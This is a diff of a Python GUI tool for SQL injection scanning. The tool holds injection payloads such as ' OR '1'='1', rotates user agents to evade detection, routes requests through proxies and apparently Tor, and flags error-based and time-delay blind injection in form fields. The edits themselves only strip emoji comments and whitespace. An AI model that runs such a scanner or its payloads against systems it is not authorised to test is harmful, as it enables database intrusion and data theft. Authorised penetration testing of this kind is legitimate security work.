@@ -17,7 +17,6 @@ from stem import Signal
 import tkinter as tk
 from tkinter import messagebox, filedialog
 
-# 🚀 Advanced SQLi Payloads (WAF Bypasses, Encoded, and Adaptive Payloads)
 SQLI_PAYLOADS = [
     "' OR '1'='1",
     "' OR '1'='1' --",
@@ -36,14 +35,12 @@ SQLI_PAYLOADS = [
 ]
 
 
-# 🎭 Randomized User-Agents to Evade Detection
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     "Mozilla/5.0 (X11; Linux x86_64)",
 ]
 
-# ⚠️ SQL Error Signatures for Different Databases
 SQL_ERRORS = {
     "MySQL": ["You have an error in your SQL syntax", "MySQL server"],
     "MSSQL": ["Microsoft SQL Server", "Unclosed quotation mark"],
@@ -131,11 +128,10 @@ class NextLevelSQLiTester:
                 response = requests.post(url, data=data, headers=headers, cookies=cookies, proxies=proxies, timeout=5)
                 end_time = time.time()
 
-                # ✅ NEW: Log every response to debug!
                 debug_info = f"\n🔎 Testing param: {param}\n⚔️ Payload: {payload}\n📡 Status: {response.status_code}\n🔄 Response: {response.text[:500]}\n"
-                print(debug_info)  # Log to console
-                self.update_results(debug_info)  # Show in GUI
-                self.root.update_idletasks()  # Force GUI refresh!
+                print(debug_info)  
+                self.update_results(debug_info) 
+                self.root.update_idletasks() 
 
             except requests.exceptions.RequestException as e:
                 self.update_results(f"🚨 Error with payload {payload} -> {str(e)}\n")
@@ -145,11 +141,11 @@ class NextLevelSQLiTester:
 
             if any(error in response.text for error in SQL_ERRORS):
                 self.update_results(
-                    f"⚠️ SQL Injection found! Payload: {payload} on {param}\n💾 Database Type: {db_type}\n")
+                    f" SQL Injection found! Payload: {payload} on {param}\n💾 Database Type: {db_type}\n")
                 self.results.append({"param": param, "payload": payload, "db_type": db_type})
 
             elif (end_time - start_time) > 5:
-                self.update_results(f"⚠️ Possible Blind SQLi (Time Delay) in {param} with {payload}\n")
+                self.update_results(f" Possible Blind SQLi (Time Delay) in {param} with {payload}\n")
                 self.results.append({"param": param, "payload": payload, "type": "Blind SQLi"})
 
     def run_tests(self):
@@ -157,7 +153,7 @@ class NextLevelSQLiTester:
         url = self.url_entry.get()
         proxy = self.proxy_entry.get()
         if not url:
-            self.update_results("❌ Please enter a URL.\n")
+            self.update_results(" Please enter a URL.\n")
             return
 
         input_fields = self.get_forms(url)
@@ -165,7 +161,7 @@ class NextLevelSQLiTester:
             self.update_results("No input fields detected.\n")
             return
 
-        self.update_results(f"🔍 Testing {len(input_fields)} parameters...\n")
+        self.update_results(f" Testing {len(input_fields)} parameters...\n")
 
         threads = []
         for param in input_fields:
@@ -176,7 +172,7 @@ class NextLevelSQLiTester:
         for thread in threads:
             thread.join()
 
-        self.update_results("✅ Scan Completed.\n")
+        self.update_results(" Scan Completed.\n")
 
     def update_results(self, message):
         """Safely update GUI from a separate thread"""
@@ -201,13 +197,6 @@ class NextLevelSQLiTester:
                     writer.writerows(self.results)
 
             messagebox.showinfo("Success", f"Results saved to {file_path}")
-
-
-
-
-
-
-
 
 
     def start_scan_thread(self):
@@ -258,7 +247,7 @@ class NextLevelSQLiTester:
             self.update_results("❌ Please enter a URL.\n")
             return
 
-        input_fields = ["username", "password", "search", "id"]  # Replace with dynamic form field extraction if needed
+        input_fields = ["username", "password", "search", "id"]  
         if not input_fields:
             self.update_results("No input fields detected.\n")
             return
